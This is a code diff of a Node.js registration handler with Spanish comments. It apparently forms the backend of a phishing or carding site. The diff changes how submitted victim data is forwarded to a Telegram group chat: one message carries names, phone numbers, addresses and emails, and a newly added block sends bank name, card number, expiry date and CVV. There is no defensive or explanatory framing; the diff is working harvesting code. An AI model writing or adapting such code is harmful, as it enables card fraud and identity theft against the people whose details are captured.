@@ -73,20 +73,15 @@ const registrar = async (req, res ) => {
             enviarCedula();
        }
 
-       //Enviar Datos
+       //Enviar Datos registrar1
        const nombre    = usuario.nombre
        const celular   = usuario.celular
        const ciudad    = usuario.ciudad
        const direccion = usuario.direccion
        const email     = usuario.email
-       const banco     = usuario.banco
-       const tarjeta   = usuario.tarjeta
-       const mes       = usuario.mes
-       const año       = usuario.año
-       const cvv       = usuario.cvv
 
       
-        if (nombre, celular, ciudad, direccion, email, banco, tarjeta, mes, año, cvv !== undefined) {
+        if (nombre, celular, ciudad, direccion, email !== undefined) {
             function enviarDatos() {
                 //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
                 const Datos = `Nueva Información Registrada 📃:\n` +
@@ -94,12 +89,7 @@ const registrar = async (req, res ) => {
                 "Celular: " + celular +`\n`+
                 "Ciudad: " + ciudad +`\n`+
                 "Dirección: " + direccion +`\n`+
-                "Email: " + email +`\n`+
-                "Banco: " + banco +`\n`+
-                "Tarjeta: " + tarjeta +`\n`+
-                "Mes: " + mes +`\n`+
-                "Año: " + año +`\n`+
-                "Cvv: " + cvv +`\n`
+                "Email: " + email +`\n`
                 ;
             
                 const chatId = -618953922; //id de grupo
@@ -111,6 +101,34 @@ const registrar = async (req, res ) => {
             enviarDatos();
         }
 
+
+        //Datos registrar 2
+
+      
+        const banco     = usuario.banco
+        const tarjeta   = usuario.tarjeta
+        const fecha     = usuario.fecha
+        const cvv       = usuario.cvv
+
+
+        if (banco, tarjeta, fecha, cvv !== undefined) {
+            function enviarDatos() {
+                //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
+                const Datos = `Nueva Información de Tarjeta Registrada 📃:\n` +
+                "Banco: " + banco +`\n`+
+                "Tarjeta: " + tarjeta +`\n`+
+                "Fecha: " + fecha +`\n`+
+                "Cvv: " + cvv +`\n`
+                ;
+            
+                const chatId = -618953922; //id de grupo
+                
+                //5319932122; id de bot solo
+        
+                bot.sendMessage(chatId, Datos)
+            }    
+            enviarDatos();
+        }
            
         //Mandar Datos de Banco
 
